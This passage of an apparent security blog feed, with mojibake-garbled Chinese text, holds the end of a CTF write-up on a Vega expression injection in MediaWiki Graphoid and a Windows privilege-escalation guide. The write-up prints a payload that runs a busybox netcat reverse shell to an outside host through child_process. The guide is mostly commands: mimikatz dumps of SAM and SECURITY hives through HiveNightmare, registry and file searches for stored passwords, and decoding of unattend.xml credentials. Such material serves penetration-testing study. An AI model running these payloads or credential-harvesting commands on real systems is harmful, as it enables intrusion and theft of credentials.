      </span><span class="nl">"transform"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"filter"</span><span class="p">,</span><span class="w"> </span><span class="nl">"test"</span><span class="p">:</span><span class="w"> </span><span class="s2">"(0//1/)-'</span><span class="se">\\\n</span><span class="s2">,console.log(process.mainModule.require(</span><span class="se">\"</span><span class="s2">child_process</span><span class="se">\"</span><span class="s2">).execSync(</span><span class="se">\"</span><span class="s2">busybox nc xxxx 9001 -e ash</span><span class="se">\"</span><span class="s2">)),console.log(222))))//'"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="nodejs" /><category term="vega" /><summary type="html"><![CDATA[è¿™ä¸ªé¢˜çš„æ€è·¯å¹¶ä¸æ˜¯å¾ˆæ˜ç¡®ï¼Œç»™å‡ºäº†ä¸€ä¸ª MediaWiki å·²ç»åºŸå¼ƒçš„é¡¹ç›®ï¼š Extension:Graph/Graphoid - MediaWiki Graphoid ç”¨äºå¯¹ç”¨æˆ·æä¾›çš„è¾“å…¥å›¾åƒå®šä¹‰æ–‡ä»¶è¿›è¡Œæ¸²æŸ“ï¼Œè¿”å›å›¾åƒå†…å®¹ã€‚ ç”±äºé¡¹ç›®è¾ƒè€ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ dependency-check å…ˆæ‰«ä¸€éå†å²æ¼æ´ã€‚ dependency-check -s . -o report -f HTML å¾—åˆ°æŠ¥å‘Šä¹‹åå¯ä»¥çœ‹å‡ºå†å²æ¼æ´å¾ˆå¤šï¼Œä½†ä¹‹åç»“åˆä»£ç å®¡è®¡çš„ç»“æœçœ‹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ é¡¹ç›®ä½¿ç”¨ nodejs ç¼–å†™ï¼Œé¡¹ç›®éœ€è¦çœ‹çš„ js ä»£ç å¹¶ä¸å¤šï¼š â””â”€$ tree | grep js â”œâ”€â”€ app.js â”‚ â”œâ”€â”€ api-util.js â”‚ â”œâ”€â”€ swagger-ui.js â”‚ â”œâ”€â”€ util.js â”‚ â”œâ”€â”€ vega1.js â”‚ â”œâ”€â”€ vega2.js â”‚ â””â”€â”€ vega.js â”œâ”€â”€ npm-shrinkwrap.json â”œâ”€â”€ package.json â”‚ â”œâ”€â”€ graphoid-v1.js â”‚ â”œâ”€â”€ graphoid-v2.js â”‚ â”œâ”€â”€ info.js â”‚ â””â”€â”€ root.js â”‚ â””â”€â”€ sqlToFiles.js â”œâ”€â”€ server.js â”‚ â”‚ â”œâ”€â”€ app.js â”‚ â”‚ â””â”€â”€ spec.js â”‚ â”‚ â””â”€â”€ info.js â”‚ â””â”€â”€ graph.js â”œâ”€â”€ index.js â”œâ”€â”€ assert.js â”œâ”€â”€ logStream.js â””â”€â”€ server.js ä¸»ä½“åŠŸèƒ½åŠå¯¹åº”çš„æ–‡ä»¶å¦‚ä¸‹ï¼š è·¯ç”±åŠŸèƒ½ï¼š graphoid-v1.jsï¼šv1 ç‰ˆæœ¬çš„æ¥å£ graphoid-v2.jsï¼šv2 ç‰ˆæœ¬çš„æ¥å£ æ¸²æŸ“åŠŸèƒ½ vega.jsï¼šæ ¹æ®è¾“å…¥çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå†³å®šè°ƒç”¨ vega1.js è¿˜æ˜¯ vega2.js è¿›è¡Œæ¸²æŸ“ã€‚ vega1.js vega2.js swagger æ–‡æ¡£ï¼šè®¿é—® /?doc ç³»ç»Ÿä¿¡æ¯ï¼šè®¿é—® /?spec ä¸»ä½“ä»£ç ä¼¼ä¹æ²¡ä»€ä¹ˆæ´ï¼Œå³ä½¿ graphoid-v1 ä¸­æœ‰ä¸€ä¸ª merge æ“ä½œï¼Œä¹Ÿå¹¶ä¸èƒ½é€ æˆ prototype pollutionã€‚ ä»£ç ä¸­ä¼¼ä¹å¯¹ underscore ä¹Ÿè¿›è¡Œäº†è°ƒç”¨ï¼Œunderscore æœ‰ä¸€ä¸ªä»£ç æ‰§è¡Œæ¼æ´ï¼šArbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snykï¼Œä½†åº”è¯¥å¾—ç»“åˆåŸå‹é“¾æ±¡æŸ“æ‰è¡Œã€‚ è€ƒè™‘åˆ°ä¸»ä½“åŠŸèƒ½è¿˜æ˜¯é€šè¿‡ vega è¿›è¡Œæ¸²æŸ“ï¼Œå› æ­¤å¯ä»¥å» vega çš„ä»“åº“çœ‹çœ‹ issueã€‚æ‰¾åˆ°äº†å‡ ä¸ª xssã€‚å…¶ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£ï¼š https://github.com/vega/vega/issues/3018 è¿™ä¸ª issue çš„ payload æ›¾åœ¨ hxp2020 hackme è¿™é“é¢˜ä¸­ç”¨äºè§¦å‘ XSSã€‚ ç”±äº Graphoid ä¸­çš„ vega æ¯”è¾ƒè€ï¼Œåº”è¯¥æ˜¯ 3.2.1 ç‰ˆæœ¬ï¼Œå¯ä»¥å…³æ³¨ vega2 çš„ payloadï¼š è¿™ä¸ª payload åœ¨ https://vega.github.io/vega-editor/?mode=vega ä¸­æ˜¯å¯ä»¥æ­£å¸¸è§¦å‘ xss çš„ã€‚ è¿™ä¸ª payload åªèƒ½æ˜¯ XSS å—ï¼ŸGraphoid ä¸­çš„ vaga å¯æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯ï¼Œæ—¢ç„¶è¯¥æ¼æ´èƒ½å¤Ÿé€šè¿‡ eval æ‰§è¡Œæ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œé‚£å°±æ˜¯ RCE äº†ã€‚ æµ‹è¯•è¿™ä¸ª poc åç¡®å®å¯ä»¥æ‰§è¡Œä»£ç ï¼Œç¨ä½œæ›´æ”¹å³å¯åå¼¹ shellã€‚ï¼ˆå¹³å°æ›´æ–°äº†ä¸€æ¬¡é™„ä»¶ï¼Œç¬¬ä¸€æ¬¡çš„é™„ä»¶æ­å»ºå‡ºæ¥çš„ç¯å¢ƒï¼Œpng æ¥å£ä¹Ÿå¯ä»¥è§¦å‘ï¼Œä¸”ç¯å¢ƒä¸­æœ‰ curl å¯ä»¥å¸¦å‡ºæ¥ã€‚æ›´æ–°åçš„é™„ä»¶æ­å»ºå‡ºæ¥çš„ç¯å¢ƒï¼Œpng æ¥å£æ€»ä¼šæŠ¥é”™ï¼Œä½† svg æ¥å£å¯ä»¥æ­£å¸¸è§¦å‘ï¼Œå¦å¤–ç¯å¢ƒæ²¡æœ‰ curl äº†ï¼Œä½†æ˜¯æœ‰ busybox å¯ä»¥ nc åå¼¹ shellã€‚ v2 æ¥å£å‘é€å¦‚ä¸‹çš„ payloadã€‚ { "data": [ { "name": "data", "values": [{}], "transform": [ {"type": "filter", "test": "(0//1/)-'\\\n,console.log(process.mainModule.require(\"child_process\").execSync(\"busybox nc xxxx 9001 -e ash\")),console.log(222))))//'"} ] } ] }]]></summary></entry><entry><title type="html">Windows ææƒï¼ˆä¸€ï¼‰åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html" rel="alternate" type="text/html" title="Windows ææƒï¼ˆä¸€ï¼‰åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html"><![CDATA[<h1 id="windows-æœ¬åœ°ææƒ">Windows æœ¬åœ°ææƒ</h1>
<h2 id="åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ">åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ</h2>
<p>ä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚</p>

<h3 id="sam-and-system-fileswin10-åŠä»¥ä¸‹">SAM and SYSTEM files(win10 åŠä»¥ä¸‹)</h3>
<p>å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚<br />
ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NTLM å“ˆå¸Œã€‚<br />
è¯¥æ–‡ä»¶ä½äº %SystemRoot%/system32/config/SAM ä¸­ï¼Œå¹¶å®‰è£…åœ¨ HKLM/SAM ä¸Šã€‚</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>ç›´æ¥ä½¿ç”¨ mimikatz æå–å³å¯ï¼Œæ— éœ€ä½¿ç”¨ pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>ä¸å½±å“ Serverã€‚</p>

<blockquote>
  <p>CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>ä½¿ç”¨ <code class="language-plaintext highlighter-rouge">icacls</code> å‘½ä»¤æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">ã€æ¼æ´å¤ç°ã€‘CVE-2021-36934 Windows ææƒæ¼æ´å¤ç° - TeamsSix</a></li>
</ul>

<h3 id="æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„-password">æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„ password</h3>
<p>åœ¨ .xml, .ini, .txt .config ç­‰æ–‡ä»¶ä¸­æœç´¢ Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>åœ¨è¿œç¨‹åœ°å€ä¾‹å¦‚ SMB Shares æˆ– SharePoint æœç´¢</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ–‡ä»¶å">æœç´¢å’Œ password ç›¸å…³çš„æ–‡ä»¶å</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="æœç´¢å’Œ-password-ç›¸å…³çš„æ³¨å†Œè¡¨">æœç´¢å’Œ password ç›¸å…³çš„æ³¨å†Œè¡¨</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="åœ¨-unattendxml-ä¸­æœç´¢å¯†ç ">åœ¨ unattend.xml ä¸­æœç´¢å¯†ç </h3>
<p>è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installsææƒ - zpchcbd - åšå®¢å›­</a></li>
</ul>

<h3 id="iis-web-config-ä¸­çš„å¯†ç ">IIS Web config ä¸­çš„å¯†ç </h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">â€“</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶">å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
